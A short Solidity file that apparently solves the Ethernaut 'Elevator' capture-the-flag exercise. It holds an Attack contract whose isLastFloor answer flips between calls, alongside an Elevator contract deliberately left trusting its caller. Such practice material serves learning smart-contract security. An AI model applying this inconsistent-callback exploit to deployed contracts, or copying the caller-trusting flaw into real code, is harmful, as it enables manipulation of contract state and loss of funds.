pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint256) external;

    function top() external view returns (bool);
}

contract Attack {
    IElevator private immutable target;
    bool isToggled = true;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function goingUp(uint _floor) external {
        target.goTo(_floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        isToggled = !isToggled;
        return isToggled;
    }
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
